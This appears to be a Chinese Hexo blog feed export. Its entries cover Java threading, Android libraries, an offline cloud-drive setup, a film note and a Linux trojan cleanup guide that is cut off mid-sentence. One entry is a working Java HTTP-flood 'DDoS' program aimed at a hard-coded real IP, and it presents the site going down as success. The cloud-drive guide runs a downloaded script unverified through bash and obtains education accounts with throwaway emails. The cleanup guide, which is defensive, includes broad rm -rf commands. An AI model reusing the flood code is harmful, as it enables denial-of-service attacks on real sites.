ac3b0e36f8f82ffe32b6463c524ad220ce6164f349d48b31b392206d7780a3a0142f332840495c6ebdf132c419ca4de12081a57fe02bd62e1a9865fae47e3b336b1e275724b930f740fac7d2962dbdbcda9dd56f99a48f409b4b9f3d78de59041325d2015bcbcf05ca0e6a8668ac89797cb8a0c22b2863e508c8962756742500e3d75c091f7542f20e0a5d0439a919e6481d7a81f7e07886366778b47d065ea7132ceb10094436109a0bdca3fe571b8a3f098a7aa7aecb00b830e72b2aa18736fa4aff4ee4e84f02c5cad5d3ae90226623cc7540a27ede936ea94d39a9669ab1f1143cb97493d815e0a0a2cfa0f5b6ba7a71d1584a1041f879f8c83156a076188c2a855e8805cabc1c51cd54f61974bd97a8e0e3ca04d04749898781cbb371c2159cf787928146223e862784c6832a8fc510a6b7fb9f5e6ed675bd3b963b12a102610752d5e527d8cbcbbb0d8d927a98a8c63929f3762a4a4468dedbf112e0ad5b3a3c9f9553b47b41a8a82db2b2f68f18a48a153895ba9dbc92a1924f9c7a9424849684202b7f38d2f11ab0577e539f4235795653d5629f07ef77d792aa92f6f7fb7209143d85ba9fd32c3d100aab89b2425858e642faa1767586d801837bb79a1b4cc656db1826386dd026f80ddf60f860c326281c8ac9256d23cfa76df70fefb6927cb222c43ff4324e45a26df7778d76ef1cc339106003ab11b93a3c578e47a35f976dcd42ed0b3f0dc3502a99cf8f25b9b59ba35bf8d9e32bbef0f45381a3ee8f1320cbf608c81eefae329753124eafdfd2048448e557c264b348f93ea4834c3d8ed3ac6bd708fc1c9ac95bc574b36df345004505abd7bf491215c52b4b5aea91b7eefd4b11573128682a17a960600b8e730298799efd012f1c6e1e93e28f6fd165312377f30b2b053c837273faab21515c67731fe26b76951c63e7a3f7e571fa9e4c3c53036d0372e2aa6e1ee96c1c632f222ccd893ae8f42334f09f5e74cba01c4a060f337eef12465a1f97310730860f693e9e8c496b9c9b1c7a1beca370f1dbd0f9c2f8f6d44138eca59a25894325a175216925b841ba4c05dc02a720b0b250a3f6476a338ccd29c9906abce93c39c45d232ab883a5f2cb29a53af90c63bab6d6ca022c68e45ce52a50813c3a38d78bb17a77a7f769a23d2b6bbe44990293b4483d0faf58bd4b4dfc271f0c8a19f6ebc6cfae5fea53f04fdfb838e4ce5d8d66019a547d17fff5d6706a84b0f043866246b84b945527cf4a1fa1fe06ef179742a7c04a8bd035d78f1ac75e700af7197034d085dee0bcefd8b40357209e22a9c8b55e1c7fe63c12c2a0caabc2e8dea13ba5ba13b3bf586537c87490b0ac57881bab349805292d3b60a0c86cc5209cb1238247b07b019179dd87c0c408c7c948a338d56da982bd7f7d1fc290069cb758421c85610cab0097d809c3843f156b367def9cadae5bdcb2d9e64ceea548cd186bcbbe8513a6f3ade8d17b42a6c285566fb5ad6619bb23ae94204d4bc73fd3839764bcf8bea6bbac531563194a21c0e9f77fba7eeb87a7400348bd122e277f683d3dd9d24f6dbb12269ca06531ca785da11455a55238ba56210ebea8059b608e0499d182af6e8bfc200326f1f608870960d6066e35ab03cacb6e2c2c6fb9040af3946d9842c48fec1ffb848f253ffba9cfbd7b9b55e1e513d9889cd5bbf6a629ecf3bc6ee0692adf3687b12fffedf3ea5305d05fc1d11f2becaa1f1a8e4ba9c4146c415c4f7bdb5ff77d8c9978688da0286d03bab599a703feff208d8e7e2dc8c37048911d98376a2c7126640d019b54fa1431ccd9c16a3ca2d01932101996b7d081bc58aa32d8925a8d56b79abc4a6fae5f60852f646db18f73c2107fca642b3177220afa3ba74cc61bc6bf745977ebe74a9df011aed46bae1585286595bcd4aca6ef17015a46800bc8e47e082a53043aa70b6a04e1072cd1800e799235665a3798bd855df8236fa09c464eb91c64eb0ba74d2a67637e48d2b3525fb93f35e7972d628f653c69dbf5e59c742eba475e3c674fceb6516e8c1515cbc8c5cc6c90711795ab35c39b3f0f8a72102154545e5ccfba418cd40fa9ac7ca716d2c6ec9d44b1f6ac4e85903f7e8df3908e0c7556f7aeb84a3c0292eb1a91cde731fc41d948b488c0afab8ff4830efd677aa348000892dc2ad62805a71681018ebe1d18d4cebdb4290ddfe9b4482f4923b3b64376c7ce416ae140937106e1d2289fdbb7166e3cb72283b504ce9e5c080d32814a41b9010966c982afc8b7dfd8c11aab99321cb768eceb7628814715a19d60d3800839bff56d9824c48ac4110a0c5409da7c3163390a53c14cd3daa1cd6fa72e27e7946312b7bf5431a490af99cdda3dee7ede5ad0364f94809a19a90a8e914b8dce0881122d218933be293cfb019d40a7e0419f77a96d69026a015c19b7c71e3cabdf96976a95288ee48a2c866789a5f187450ca286e5ea5dec336321b01ffc4d12715fd38be6bc4f57cec37ef2ceaa15524a7c253f9d835bce1cb8855c993e8bbec4ef42d28b894e7a404a96e147e822973f2418084eb37e61a024b3a4fcb2537aec2abac510a7f8941df5c8731d890c4b903e76b2dd3feeeb52ce43d5ca7385e290b5c511587938034e4778a15b70f1db9ac04b79ef72f476ae3306bf1bc189c2ad09e838f37be897f0f9232d38b90621417fcd597f37136e1c6a985aef500da6fffad8b9cdc8d1ee70aed4e705986ac8da4eda90270d2d676624385b5bfca83f03e1717c7124a4b55e547244a5cc237dccc08c2b16152fa97de701ef59200cc60a3ae960ce54ee517c1dad6b3e190927863d579e646f18165f33b17159adcba059a9410afaa2a4daf67e255aa1befd5d9eb3baf954918acaf983b46706900d4fc819437e325ad7ec6ebba53f9b92e3fe9dd84cdef169a1392aba88a0df332a951a6929753a9cea002103e1837f54a221a10de10aada8b</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">多年积累，持续更新！！！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 不为人知 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>线程同步锁Synchronized</title>
      <link href="/posts/9083.html"/>
      <url>/posts/9083.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://ws1.sinaimg.cn/large/e3bf8736gy1fyqgc51a2lj22401eo156.jpg"></p><span id="more"></span><h1 id="线程同步锁Synchronized"><a href="#线程同步锁Synchronized" class="headerlink" title="线程同步锁Synchronized"></a>线程同步锁Synchronized</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AccountingSync</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">AccountingSync</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AccountingSync</span>();</span><br><span class="line">    <span class="keyword">static</span> <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//省略其他耗时操作....</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (AccountingSync.class) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i &lt; <span class="number">100</span>) &#123;</span><br><span class="line">                    i++;</span><br><span class="line">                    System.out.println(Thread.currentThread().getName() + <span class="string">&quot;    &quot;</span>+ i);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">AccountingSync</span> <span class="variable">accountingSync</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AccountingSync</span>();</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(accountingSync);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(accountingSync);</span><br><span class="line">        t1.start();</span><br><span class="line">        t2.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DDoS攻击-Java实现</title>
      <link href="/posts/27312.html"/>
      <url>/posts/27312.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://ws1.sinaimg.cn/large/e3bf8736ly1fypz0k52q6j22i01o01kz.jpg"></p><span id="more"></span><h3 id="转载"><a href="#转载" class="headerlink" title="转载"></a>转载</h3><blockquote><p>分布式拒绝服务(DDoS:Distributed Denial of Service)攻击指借助于客户/服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DDoS攻击，从而成倍地提高拒绝服务攻击的威力。通常，攻击者使用一个偷窃帐号将DDoS主控程序安装在一个计算机上，在一个设定的时间主控程序将与大量代理程序通讯，代理程序已经被安装在网络上的许多计算机上。代理程序收到指令时就发动攻击。利用客户/服务器技术，主控程序能在几秒钟内激活成百上千次代理程序的运行。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DDos</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ExecutorService</span> <span class="variable">es</span> <span class="operator">=</span> Executors.newFixedThreadPool(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Mythread</span> <span class="variable">mythread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Mythread</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(mythread);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++) &#123;</span><br><span class="line"></span><br><span class="line">            es.execute(thread);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Mythread</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://221.232.148.51/guojibu/&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="type">URLConnection</span> <span class="variable">conn</span> <span class="operator">=</span> url.openConnection();</span><br><span class="line"></span><br><span class="line">                System.out.println(<span class="string">&quot;发包成功！&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(</span><br><span class="line"></span><br><span class="line">                        conn.getInputStream());</span><br><span class="line"></span><br><span class="line">                <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line">                <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">                <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (bis != <span class="literal">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> ((len = bis.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">                        sb.append(<span class="keyword">new</span> <span class="title class_">String</span>(bytes, <span class="number">0</span>, len));</span><br><span class="line"></span><br><span class="line">                        System.out.println(<span class="string">&quot;攻击成功！&quot;</span>);</span><br><span class="line"></span><br><span class="line">                        bis.close();</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (MalformedURLException e) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">                e.printStackTrace();</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">                e.printStackTrace();</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>网站打不开就是攻击成功了</p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android常见图片处理框架</title>
      <link href="/posts/5489.html"/>
      <url>/posts/5489.html</url>
      
        <content type="html"><![CDATA[<blockquote><h4 id="注意：第三方图片处理框架内部都已经封装了LruCatch，用来处理大图的加载，避免了OOM异常，使用了线程池来管理线程，避免了开启多个线程造成的资源的浪费，对于更新UI，内部也已经封装了Handler来进行线程间通信，将数据发送到UI线程来进行更新UI线程"><a href="#注意：第三方图片处理框架内部都已经封装了LruCatch，用来处理大图的加载，避免了OOM异常，使用了线程池来管理线程，避免了开启多个线程造成的资源的浪费，对于更新UI，内部也已经封装了Handler来进行线程间通信，将数据发送到UI线程来进行更新UI线程" class="headerlink" title="注意：第三方图片处理框架内部都已经封装了LruCatch，用来处理大图的加载，避免了OOM异常，使用了线程池来管理线程，避免了开启多个线程造成的资源的浪费，对于更新UI，内部也已经封装了Handler来进行线程间通信，将数据发送到UI线程来进行更新UI线程"></a>注意：第三方图片处理框架内部都已经封装了LruCatch，用来处理大图的加载，避免了OOM异常，使用了线程池来管理线程，避免了开启多个线程造成的资源的浪费，对于更新UI，内部也已经封装了Handler来进行线程间通信，将数据发送到UI线程来进行更新UI线程</h4></blockquote><h3 id="Glide："><a href="#Glide：" class="headerlink" title="Glide："></a>Glide：</h3><p>&emsp;&emsp;默认使用Hurlconnection加载图片，一个比较轻量级的图片加载框架，通过配合图片加载库的使用，可以做出多种图片加载特效：如可以自定义各种形状的图片，和图片加载的样式，另外还可以设置默认图片等等</p><h3 id="Picasso："><a href="#Picasso：" class="headerlink" title="Picasso："></a>Picasso：</h3><p>&emsp;&emsp;使用okHttp加载图片，使用方式与Glide类似，而且使用的类库和Glide是相同的，实现效果是基本上一样的，也可以设置默认图片，但是Picasso这个框架默认的颜色模式是ARGB8888，Glide的颜色模式是RGB565，Glide会根据图片的宽高压缩图片，Picasso不会</p><h3 id="Fresco："><a href="#Fresco：" class="headerlink" title="Fresco："></a>Fresco：</h3><p>&emsp;&emsp;把图片加载后放在了供JVM使用的内存区域，提高了应用可以使用的内存大小，不会出现OOM异常，支持渐进的图片加载，内部封装了图片加载控件，相比较其他两个加载图片的框架，他的内存占用就比较小，同时他可以配合SVG图片，呈现出多种多样的样式，加载原型图片更是小意思</p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android studio如何用GIF图作为背景</title>
      <link href="/posts/53646.html"/>
      <url>/posts/53646.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://ws1.sinaimg.cn/large/e3bf8736ly1fypyrvuet2j22lo1qgnpj.jpg"></p><span id="more"></span><h3 id="引用第三方库"><a href="#引用第三方库" class="headerlink" title="引用第三方库"></a>引用第三方库</h3><p>1、先将你需要的GIF进行压缩，不然有可能会内存溢出</p><p>2、将你的GIF放到drawable当中</p><p>3、引入GIF依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//引入GIF背景动态图实现依赖</span><br><span class="line">compile &#x27;pl.droidsonroids.gif:android-gif-drawable:1.1.+&#x27;</span><br></pre></td></tr></table></figure><p>4、添加自定义GIF控件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;pl.droidsonroids.gif.GifImageView</span><br><span class="line">    android:layout_width=&quot;match_parent&quot;</span><br><span class="line">    android:layout_height=&quot;match_parent&quot;</span><br><span class="line">    android:background=&quot;@drawable/lutos_background&quot; /&gt; </span><br></pre></td></tr></table></figure><p>5、完成</p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>离线网盘搭建教程</title>
      <link href="/posts/55012.html"/>
      <url>/posts/55012.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://ws1.sinaimg.cn/large/e3bf8736gy1fyqg7xepfpj21260pgn41.jpg"></p><span id="more"></span><h3 id="Aria2-AriaNg-OneIndex-rclone-示例"><a href="#Aria2-AriaNg-OneIndex-rclone-示例" class="headerlink" title="Aria2+AriaNg+OneIndex(+rclone)示例"></a>Aria2+AriaNg+OneIndex(+rclone)<a href="https://od.daoji.ml/">示例</a><hr></h3><p><a href="https://im.from.io/" title="免费临时邮箱过office365">免费临时邮箱过office365</a></p><hr><p><img src="https://od.daoji.ml/image/TuChuang/TIM%E5%9B%BE%E7%89%8720180731222054.png"><br/></p><h3 id="一、获得5T的OneDrive网盘账号"><a href="#一、获得5T的OneDrive网盘账号" class="headerlink" title="一、获得5T的OneDrive网盘账号 "></a>一、获得5T的OneDrive网盘账号 <hr></h3><p>点击上面的链接获取临时邮箱，然后按照图片的超链接去注册一个账号，直接就是OneDrive网盘教育版了，直接就有5T容量了。<br>（或者去<a href="http://az.pl/">http://az.pl</a>申请一个免费的edu.pl后缀的域名，自己搭建邮箱也能过office365教育版）<br/><br/></p><h3 id="二、安装Aria2"><a href="#二、安装Aria2" class="headerlink" title="二、安装Aria2"></a>二、安装Aria2</h3><hr>**习惯了用CentOS，这里全程用CentOS 7来演示。**    安装Aria2这里推荐doub.io的一键脚本，方便快捷又好用。<br>执行下面的代码下载并运行脚本。    <pre><code>wget -N --no-check-certificate https://softs.loan/Bash/aria2.sh &amp;&amp; chmod +x aria2.sh &amp;&amp; bash aria2.sh # 如果上面这个脚本无法下载，尝试使用备用下载：wget -N --no-check-certificate https://raw.githubusercontent.com/ToyoDAdoubi/doubi/master/aria2.sh &amp;&amp; chmod +x aria2.sh &amp;&amp; bash aria2.sh</code></pre><br><blockquote><p>启动：/etc/init.d/aria2 start</p><p>停止：/etc/init.d/aria2 stop</p><p>重启：/etc/init.d/aria2 restart</p><p>查看状态：/etc/init.d/aria2 status</p><p>配置文件：/root/.aria2/aria2.conf （配置文件包含中文注释，但是一些系统可能不支持显示中文）</p><p>令牌密匙：随机生成（可以自己修改 6. 修改 配置文件）</p><p>下载目录：/usr/local/caddy/www/aria2/Download</p></blockquote><br><h3 id="三、部署AriaNg"><a href="#三、部署AriaNg" class="headerlink" title="三、部署AriaNg"></a>三、部署AriaNg</h3><hr><p>Aria2用Linux指令来操作的话太麻烦，为了简化操作就用GUI面板来操作。<br></p><p><a href="https://github.com/mayswind/AriaNg/releases/download/0.4.0/aria-ng-0.4.0.zip">AriaNg下载</a><br><a href="https://github.com/mayswind/AriaNg/releases/latest" title="https://github.com/mayswind/AriaNg/releases/latest">Github最新版下载地址</a><br>​<br>AriaNg可以像网站一样部署在服务器上，这里介绍最简单的用法。<br>下载解压，找到文件夹里面的<code>index.html</code>双击打开。</p><p><img src="https://od.daoji.ml/image/TuChuang/TIM%E6%88%AA%E5%9B%BE20180731231439.png"></p><p>设置好之后就能远程下载种子磁力了。</p><h3 id="四、部署OneIndex"><a href="#四、部署OneIndex" class="headerlink" title="四、部署OneIndex"></a>四、部署OneIndex</h3><hr><p>部署OneIndex之前先安装运行环境。新手用<a href="https://www.bt.cn/" title="https://www.bt.cn/">宝塔https://www.bt.cn/</a>非常方便。     </p><p>然后就部署Oneindex网站源码，可以参照这篇文章<a href="https://www.sabia.cc/oneindex-onedrive-file-downloads.html" title="https://www.sabia.cc/oneindex-onedrive-file-downloads.html">部署OndeIndex</a>。</p><blockquote><p>OneIndex是通过OneDrive的API管理的程序，既能做使用OneDrive做外链，又能快速上传文件到OneDrive，达到做离线下载，文件备份的目的。</p></blockquote><h3 id="五、安装Rclone"><a href="#五、安装Rclone" class="headerlink" title="五、安装Rclone"></a>五、安装Rclone</h3><hr><blockquote><p>Rclone是将OneDrive作为一个储存空间挂载在本地分区上，也就是将一个本地文件夹，关联OneDrive上的一个文件夹上，当本地文件移动到本地文件夹中，将会自动上传到OneDrive上。<br>如果需求不大，可以选<code>Oneindex</code>或<code>Rclone</code>中的一个安装就行了。  </p></blockquote><p>安装方法可以参照这两篇文章<a href="https://www.moerats.com/archives/491/" title="https://www.moerats.com/archives/491/">《在于Debian / Ubuntu上使用rclone挂载OneDrive网盘》</a>和<a href="http://www.liuwe.com/archives/1196.html" title="http://www.liuwe.com/archives/1196.html">《Centos7使用RCLONE挂载OneDrive搭建离线下载，在线播放》</a>。</p><h3 id="六、一键上传脚本"><a href="#六、一键上传脚本" class="headerlink" title="六、一键上传脚本"></a>六、一键上传脚本</h3><hr><p><a href="http://www.liuwe.com/archives/1196.html"><a href="http://www.liuwe.com/archives/1196.html">Centos7使用RCLONE挂载OneDrive搭建离线下载，在线播放</a></a>  </p><p><a href="https://lala.im/2982.html">荒岛的自动上传</a></p><p><a href="https://www.234du.com/1171.html">使用Aria2 + ARIANG + oneindex + onedrive建立离线BT下载/在线播放</a></p><p><a href="http://sysu.edu.pl/">临时邮箱地址</a></p><p><a href="https://www.sabia.cc/category/%E4%B8%80%E9%94%AE%E8%84%9A%E6%9C%AC">一键脚本</a></p><img src='https://od.daoji.ml/image/TuChuang/%E7%A6%BB%E7%BA%BF%E6%B5%81%E7%A8%8B%E5%9B%BE.png' />]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《她和她的猫》</title>
      <link href="/posts/44241.html"/>
      <url>/posts/44241.html</url>
      
        <content type="html"><![CDATA[<!-- ![](https://tva1.sinaimg.com/large/e3bf8736ly1fypxk9jk66j21630no3z0.jpg) --><span id="more"></span><blockquote><p>如果说《如果猫从世界上消失》中的猫是与母亲的羁绊，那么《她和她的猫》中的猫就是无言的陪伴，是对她的关爱的报恩。</p><p>远处的事物小而模糊，近处的事物清晰可见，回忆也是一样。往昔的回忆模模糊糊，最近的事情则记得清清楚楚。尽管如此，近来总觉得，遥远的往昔，也像刚刚发生过的一样历历在目。</p></blockquote><p><img src="https://tva1.sinaimg.com/large/e3bf8736ly1fypxn1l2ndj21630no7hi.jpg"></p><p><img src="https://tva1.sinaimg.com/large/e3bf8736ly1fypxnuhbxvj21630no16b.jpg"></p><p><img src="https://tva1.sinaimg.com/large/e3bf8736ly1fypxqsvtlgj21630noql5.jpg"></p><p><img src="https://tva1.sinaimg.com/large/e3bf8736ly1fypxqblwanj21630nowo9.jpg"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux抓出背后的木马程序并处理</title>
      <link href="/posts/19424.html"/>
      <url>/posts/19424.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.com/large/e3bf8736gy1fyqcp6wozhj225r1fux6s.jpg"></p><span id="more"></span><h3 id="·通过top命令查看进程情况"><a href="#·通过top命令查看进程情况" class="headerlink" title="·通过top命令查看进程情况"></a>·通过top命令查看进程情况</h3><pre><code>top  </code></pre><p><img src="https://yqfile.alicdn.com/3fc0dc0046bf64d22c788b86063c20378756710b.png"><br>获取<code>pid</code>后可以用<code>kill [PID]</code>来关闭进程<br>​    </p><h3 id="·通过进程查询异常程序所在目录"><a href="#·通过进程查询异常程序所在目录" class="headerlink" title="·通过进程查询异常程序所在目录"></a>·通过进程查询异常程序所在目录</h3><p>通过执行<code>ll /proc/$PID/exe</code>，($PID即进程ID)可获得异常进程的目录    </p><p><img src="https://yqfile.alicdn.com/249ac3353c4e4dc8482f1df07e1b059cb420d78a.png">    </p><p>此程序一般是由计划任务产生的，Linux系统中默认创建了计划任务后会在/var/spool/cron目录下创建对应用户的计划任务脚本，执行ls /var/spool/cron 查询一下系统中是否有异常的计划任务脚本程序。<br>可以看到，在此目录下有1个root的计划任务脚本和一个异常的目录crontabs（默认情况下不会有此目录，用户创建计划任务也不会产生此目录） </p><p><img src="https://yqfile.alicdn.com/add7471c149fe18e39d9048bc65caace21701c25.png">  </p><p>查看脚本内容，有一个每隔10分钟便会通过curl下载执行的脚本程序（crontabs目录下为同样内容的计划任务）  </p><p><img src="https://yqfile.alicdn.com/d89bc571d8ba01a1f9eab99af0112674c67196aa.png"></p><p>手动将脚本内容下载到本地，脚本内容如下</p><p><img src="https://yqfile.alicdn.com/38ba3d1db70e742993f16bd8c0cf155422fc58a8.png"></p><h4 id="分析此脚本，主要进行了如下修改"><a href="#分析此脚本，主要进行了如下修改" class="headerlink" title="分析此脚本，主要进行了如下修改"></a>分析此脚本，主要进行了如下修改</h4><p>1、创建了上述查看到的两个计划任务脚本<br>2、创建了密钥认证文件，导入到了/root/.ssh目录下（当前脚本的密钥文件名是KHK75NEOiq，此名称可能会有所变化，要根据具体情况进行核实）<br>3、修改ssh配置文件允许了root远程登录，允许了密钥认证，修改默认的密钥认证文件名<br>4、重启了sshd服务使配置生效<br>5、创建了伪装程序ntp，并运行了ntp程序<br>6、查询系统中是否有正常运行的计划任务，杀死正在运行的计划任务进程。  </p><h4 id="【处理方法】"><a href="#【处理方法】" class="headerlink" title="【处理方法】"></a>【处理方法】</h4><p>根据以上分析，提供以下处理方法<br>1、删除计划任务脚本中异常配置项，如果当前系统之前并未配置过计划任务，可以直接执行rm -rf /var/spool/cron/* 情况计划脚本目录即可。<br>2、删除黑客创建的密钥认证文件，如果当前系统之前并未配置过密钥认证，可以直接执行rm -rf /root/.ssh/* 清空认证存放目录即可。如果有配置过密钥认证，需要删除指定的黑客创建的认证文件即可，当前脚本的密钥文件名是KHK75NEOiq，此名称可能会有所变化，要根据具体情况进行核实。<br>3、修复ssh配置项，根据个人需求进行修改，一般默认脚本中进行修改的PermitRootLogin、RSAAuthentication、PubkeyAuthentication为开启状态，需要修改的是密钥认证文件名，建议修改成默认值AuthorizedKeysFile 